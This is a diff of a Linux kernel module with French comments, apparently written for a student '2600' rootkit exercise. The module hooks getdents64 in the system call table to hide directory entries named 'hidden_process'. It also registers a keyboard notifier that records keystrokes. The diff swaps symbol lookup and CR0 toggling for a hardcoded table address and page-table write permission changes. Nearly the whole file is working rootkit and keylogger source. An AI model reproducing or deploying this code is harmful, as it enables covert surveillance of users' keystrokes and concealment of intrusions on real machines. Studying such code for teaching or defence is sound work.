@@ -1,129 +1,143 @@
-#include <linux/module.h>         // Inclusion des headers nécessaires
-#include <linux/kernel.h>
-#include <linux/init.h>
-#include <linux/syscalls.h>
-#include <linux/dirent.h>
-#include <linux/uaccess.h>
-#include <linux/slab.h>
-#include <linux/namei.h>
-#include <linux/version.h>
-#include <linux/kbd_kern.h>
-#include <linux/keyboard.h>
-#include <linux/input.h>
+#include <linux/module.h>         // Inclut les définitions pour les modules du noyau
+#include <linux/kernel.h>         // Inclut les définitions pour les fonctions du noyau de base
+#include <linux/init.h>           // Inclut les macros pour les fonctions d'initialisation et de nettoyage des modules
+#include <linux/syscalls.h>       // Inclut les définitions pour les appels système
+#include <linux/dirent.h>         // Inclut les définitions pour les entrées de répertoires
+#include <linux/uaccess.h>        // Inclut les fonctions pour copier les données entre l'espace utilisateur et le noyau
+#include <linux/slab.h>           // Inclut les fonctions pour l'allocation de mémoire dans le noyau
+#include <linux/keyboard.h>       // Inclut les définitions pour interagir avec les événements du clavier
 
-// Informations sur le module
-MODULE_LICENSE("GPL");                         // Licence du module
-MODULE_AUTHOR("RUCKTOOA THOMAS ET Ariel Perez"); // Auteur(s) du module
-MODULE_DESCRIPTION("Rootkit qui cache les processus et keylogger intégré"); // Description du module
+MODULE_LICENSE("GPL");            // Déclare que le module utilise une licence GPL en gros utiliser et modifier le logiciel librement
+MODULE_AUTHOR("Rootkit Exercice pour 2600 Ariel et Thomas"); // En bref ça Indique l'auteur du module
+MODULE_DESCRIPTION("Rootkit avec la fonction getdents64 et un keylogger"); // Décrit ce que fait le module
 
-// Déclaration de kallsyms_lookup_name pour trouver des symboles dans le noyau, en gros c'est une fonction du noyau Linux ca permet de trouver l'adresse de fonctions ou de variables dans le noyau en utilisant simplement leur nom
-// un peu comme si tu avait un annuaire qui te dit exactement ou est ce que tu cherche
-static unsigned long (*kallsyms_lookup_name)(const char *name);
-
-unsigned long *syscall_table;                  // Pointeur vers la table des appels système
+// Adresse statique de sys_call_table j'ai essayé sans cesse de la trouver en automatique mais ça mène à des erreurs de compilations quand je fais mon makefile, si je me souviens bien du coup j'ai pris l'addresse statique
+unsigned long sys_call_table = 0xffffffffa5200320; // Définit l'adresse de la table des appels système que j'ai selectionné du coup
 
 // Pointeurs pour stocker les adresses des fonctions d'origine
-asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent64 __user *, unsigned int);
-asmlinkage int (*original_sys_open)(const char __user *, int, umode_t);
+asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int); // Déclare un pointeur vers la fonction d'origine getdents64
 
 // Buffer pour stocker les frappes de clavier
-static char keystroke_buffer[1024];            // Tableau pour enregistrer les frappes de clavier
-static int buffer_index = 0;                   // Index pour le tableau de frappes
+static char keystroke_buffer[1024];   // Déclare un tableau pour enregistrer les frappes de clavier
+static int buffer_index = 0;          // Indice actuel dans le buffer de frappes
 
-// Fonction hookée pour getdents (pour cacher des fichiers)
-asmlinkage int hooked_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
+// Fonction pour rendre la mémoire en lecture/écriture et lecture seule
+void make_rw(unsigned long address) { // Rend la mémoire de l'adresse spécifiée en lecture/écriture
+    unsigned int level;
+    pte_t *pte = lookup_address(address, &level);
+    if (pte->pte & ~_PAGE_RW)
+        pte->pte |= _PAGE_RW; // Met à jour les permissions de la page pour autoriser l'écriture
+}
+
+void make_ro(unsigned long address) { // Rend la mémoire de l'adresse spécifiée en lecture seule
+    unsigned int level;
+    pte_t *pte = lookup_address(address, &level);
+    pte->pte = pte->pte & ~_PAGE_RW; // Met à jour les permissions de la page pour autoriser uniquement la lecture
+}
+
+// Fonction hookée pour getdents64
+asmlinkage int hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
     int nread;
-    struct linux_dirent64 *d, *kdirent, *prev = NULL;
+    struct linux_dirent64 *kdirent, *current_dir, *prev = NULL;
     unsigned long offset = 0;
 
-    nread = original_getdents(fd, dirp, count); // Appel de la fonction originale
+    nread = original_getdents64(fd, dirp, count); // Appelle la fonction d'origine getdents64
     if (nread <= 0)
-        return nread;
+        return nread; // Si aucune donnée n'est lue, retourne immédiatement
 
-    kdirent = kzalloc(nread, GFP_KERNEL);       // Allocation mémoire
-    if (kdirent == NULL)
-        return nread;
+    kdirent = kzalloc(nread, GFP_KERNEL); // Alloue de la mémoire pour stocker les données de répertoire on fait ça pour permettre au noyau de lire et modifier ces données sans risquer 
+// des erreurs de segmentation. Une fois les modifications nécessaires effectuées, les données modifiées peuvent être copiées de nouveau dans l'espace utilisateur du coup 
+    if (!kdirent)
+        return nread; // Si l'allocation échoue, retourne immédiatement
 
-    if (copy_from_user(kdirent, dirp, nread)) { // Copie des données utilisateur dans le noyau
-        kfree(kdirent);                         // Libération de la mémoire si erreur
+    if (copy_from_user(kdirent, dirp, nread)) { // Copie les données de l'utilisateur vers le noyau
+        kfree(kdirent); // Libère la mémoire si la copie échoue
         return nread;
     }
 
     while (offset < nread) {
-        d = (struct linux_dirent64 *)((char *)kdirent + offset); // Itération sur les entrées de répertoire
-        if (strstr(d->d_name, "hidden_process")) { // Si le nom de fichier contient "hidden_process"
+        current_dir = (struct linux_dirent64 *)((char *)kdirent + offset); // Parcourt les entrées de répertoire
+        if (strstr(current_dir->d_name, "hidden_process")) { // Vérifie si le nom de fichier contient "hidden_process"
             if (prev)
-                prev->d_reclen += d->d_reclen;   // Fusionne avec l'entrée précédente
+                prev->d_reclen += current_dir->d_reclen; // Fusionne avec l'entrée précédente si elle existe
             else
-                memmove(d, (char *)d + d->d_reclen, (nread - offset - d->d_reclen)); // Cache l'entrée
-            nread -= d->d_reclen;                // Réduit la taille lue
+                memmove(current_dir, (char *)current_dir + current_dir->d_reclen, nread - offset - current_dir->d_reclen); // Cache l'entrée
+            nread -= current_dir->d_reclen; // Réduit le nombre total de bytes lus
         } else {
-            prev = d;                            // Met à jour l'entrée précédente
+            prev = current_dir; // Met à jour l'entrée précédente
         }
-        offset += d->d_reclen;                   // Passe à l'entrée suivante
+        offset += current_dir->d_reclen; // Passe à l'entrée suivante
     }
 
-    if (copy_to_user(dirp, kdirent, nread)) {    // Copie des données modifiées vers l'utilisateur
-        kfree(kdirent);                         // Libération de la mémoire
+    if (copy_to_user(dirp, kdirent, nread)) { // Copie les données modifiées vers l'utilisateur
+        kfree(kdirent); // Libère la mémoire si la copie échoue
         return nread;
     }
 
-    kfree(kdirent);                             // Libération de la mémoire
-    return nread;
+    kfree(kdirent); // Libère la mémoire allouée
+    return nread; // Retourne le nombre total de bytes lus (potentiellement modifié)
 }
 
 // Fonction pour enregistrer les frappes de clavier
 static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
-    
-    if (code == KBD_KEYSYM && param->down) {    // Si une touche est enfoncée
-        keystroke_buffer[buffer_index++] = param->value; // Enregistre la valeur de la touche
+
+    if (code == KBD_KEYSYM && param->down) { // Vérifie si une touche est enfoncée
+        keystroke_buffer[buffer_index++] = param->value; // Enregistre la valeur de la touche dans le buffer
         if (buffer_index >= sizeof(keystroke_buffer))
-            buffer_index = 0;                   // Réinitialise l'index si le buffer est plein
+            buffer_index = 0; // Réinitialise le buffer s'il est plein
     }
 
-    return NOTIFY_OK;                           // Retourne OK pour notifier que l'événement est géré
+    return NOTIFY_OK; // Retourne OK pour continuer la notification
 }
 
 // Structure pour enregistrer le keylogger
 static struct notifier_block keylogger_notifier = {
-    .notifier_call = keylogger_notify           // Associe la fonction keylogger_notify à la structure
+    .notifier_call = keylogger_notify, // Associe la fonction de notification au keylogger
 };
 
-// Fonction d'initialisation du rootkit
+// Initialisation du module
 static int __init rootkit_init(void) {
-    printk(KERN_INFO "Rootkit loaded\n");       // Affiche un message de chargement du rootkit
+    printk(KERN_INFO "rootkit_init : Début\n");
 
-    // Localisation de kallsyms_lookup_name
-    kallsyms_lookup_name = (void *)kallsyms_lookup_name("kallsyms_lookup_name");
+    // Rendre la mémoire de sys_call_table en lecture/écriture
+    make_rw(sys_call_table);
 
-    // Localisation de la table des appels système
-    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+    // Sauvegarder la fonction originale et injecter la fonction hookée
+    original_getdents64 = (void *)((unsigned long *)sys_call_table)[__NR_getdents64];
+    ((unsigned long *)sys_call_table)[__NR_getdents64] = (unsigned long)hooked_getdents64;
 
-    // Localisation des adresses des fonctions d'origine
-    write_cr0(read_cr0() & (~0x10000));         // Désactive la protection en écriture du CR0
-    original_getdents = (void*)syscall_table[__NR_getdents64]; // Sauvegarde la fonction originale getdents
-    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents; // Remplace par la fonction hookée
-    write_cr0(read_cr0() | 0x10000);            // Réactive la protection en écriture du CR0
+    // Rendre la mémoire de sys_call_table en lecture seule
+    make_ro(sys_call_table);
 
-    // Enregistrer le notifier pour le keylogger
-    register_keyboard_notifier(&keylogger_notifier); // Enregistre la fonction de keylogger
+    // Enregistrer le keylogger
+    register_keyboard_notifier(&keylogger_notifier);
 
+    printk(KERN_INFO "rootkit_init : Terminé\n");
     return 0;
 }
 
-// Fonction de nettoyage du rootkit
+// Déchargement du module
 static void __exit rootkit_exit(void) {
-    // Restauration des adresses des fonctions d'origine
-    write_cr0(read_cr0() & (~0x10000));         // Désactive la protection en écriture du CR0
-    syscall_table[__NR_getdents64] = (unsigned long)original_getdents; // Restaure la fonction originale getdents
-    write_cr0(read_cr0() | 0x10000);            // Réactive la protection en écriture du CR0
+    printk(KERN_INFO "rootkit_exit : Début\n");
 
-    // Désenregistrer le notifier pour le keylogger
-    unregister_keyboard_notifier(&keylogger_notifier); // Désenregistre la fonction de keylogger
+    // Rendre la mémoire de sys_call_table en lecture/écriture 1 
+    make_rw(sys_call_table);
 
-    printk(KERN_INFO "Rootkit unloaded\n");     // Affiche un message de déchargement du rootkit
+    // Restaurer la fonction originale
+    ((unsigned long *)sys_call_table)[__NR_getdents64] = (unsigned long)original_getdents64;
+
+    // Rendre la mémoire de sys_call_table en lecture seule 3 
+    make_ro(sys_call_table);
+
+    // Décharger le keylogger
+    unregister_keyboard_notifier(&keylogger_notifier);
+
+// EN Bref, j'ai fais ces étapes (du 1 au 3)  pour que nous puissions temporairement modifier la table des appels système pour nos besoins (par exemple, intercepter des appels système dans mon cas), 
+//puis restaurer le système à son état d'origine de manière sûre et propre. (pour protéger l'intégrité du noyau)
+
+    printk(KERN_INFO "rootkit_exit : Module déchargé\n"); // Je print une petite phrase pour dire que j'ai déchargé le module afin que l'user ait l'info
 }
 
-module_init(rootkit_init);                      // Indique la fonction d'initialisation du module
-module_exit(rootkit_exit);                      // Indique la fonction de nettoyage du module
+module_init(rootkit_init); // Spécifie la fonction à appeler lors du chargement du module
+module_exit(rootkit_exit); // Spécifie la fonction à appeler lors du déchargement du module
